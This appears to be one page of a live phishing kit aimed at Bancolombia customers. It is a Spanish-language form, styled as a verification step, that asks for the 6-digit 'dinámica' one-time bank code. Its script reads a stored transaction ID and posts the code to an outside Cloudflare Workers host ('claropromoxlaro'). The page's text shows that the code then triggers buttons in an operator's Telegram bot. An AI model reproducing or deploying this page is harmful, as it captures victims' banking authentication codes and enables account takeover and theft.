<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ingresar Din√°mica</title>
<style>
body {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    background: #f9f9f9;
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
}
.container {
    background: #fff;
    padding: 30px;
    border-radius: 15px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.15);
    width: 350px;
    text-align: center;
}
h2 {
    color: #333;
    margin-bottom: 20px;
    font-size: 1.5rem;
}
.input-group {
    margin-bottom: 20px;
}
input {
    width: 100%;
    padding: 12px 15px;
    margin: 8px 0;
    font-size: 16px;
    border: 2px solid #ddd;
    border-radius: 8px;
    box-sizing: border-box;
    transition: border-color 0.3s;
}
input:focus {
    border-color: #28a745;
    outline: none;
}
button {
    width: 100%;
    padding: 14px;
    font-size: 16px;
    font-weight: bold;
    background: #28a745;
    color: white;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    transition: background 0.3s;
}
button:hover {
    background: #218838;
}
button:disabled {
    background: #6c757d;
    cursor: not-allowed;
}
.info {
    background: #e9ecef;
    padding: 10px;
    border-radius: 5px;
    margin-top: 15px;
    font-size: 0.9rem;
    color: #495057;
}
</style>
</head>
<body>
<div class="container">
    <h2>üîê Ingresar C√≥digo Din√°mica</h2>
    <div class="input-group">
        <input type="text" id="dinamica" placeholder="Ingresa el c√≥digo de 6 d√≠gitos" maxlength="6">
    </div>
    <button id="enviar">Enviar y Activar Botones</button>
    
    <div class="info">
        ‚ÑπÔ∏è Este c√≥digo activar√° los botones en Telegram para continuar con la verificaci√≥n.
    </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', () => {
    const dinamicaInput = document.getElementById('dinamica');
    const enviarBtn = document.getElementById('enviar');
    
    // Validar que solo sean n√∫meros
    dinamicaInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, '');
        
        // Habilitar bot√≥n solo si hay 6 d√≠gitos
        enviarBtn.disabled = e.target.value.length !== 6;
    });
    
    // Enviar con Enter
    dinamicaInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter' && dinamicaInput.value.length === 6) {
            enviarDinamica();
        }
    });
});

async function enviarDinamica() {
    const dinamica = document.getElementById('dinamica').value;
    const bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
    const transactionId = bancoldata.transactionId;

    if (!dinamica || dinamica.length !== 6) {
        alert("Por favor ingresa un c√≥digo de 6 d√≠gitos.");
        return;
    }

    if (!transactionId) {
        alert("Error: No se encontr√≥ la transacci√≥n actual.");
        return;
    }

    try {
        const response = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/reset", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                id: transactionId,
                dinamica: dinamica
            })
        });

        const result = await response.json();
        
        if (result.ok) {
            // Guardar din√°mica en localStorage
            bancoldata.dinamica = dinamica;
            localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
            
            alert("‚úÖ Din√°mica enviada correctamente. Los botones se han activado en Telegram.");
            
            // Redirigir a loading para esperar siguiente acci√≥n
            window.location.href = 'loading.html';
            
        } else {
            alert("‚ùå Error: " + (result.error || "No se pudo enviar la din√°mica"));
        }
    } catch(e) {
        console.error("Error:", e);
        alert("‚ùå Error de conexi√≥n al enviar la din√°mica.");
    }
}

document.getElementById("enviar").addEventListener("click", enviarDinamica);
</script>
</body>
</html>
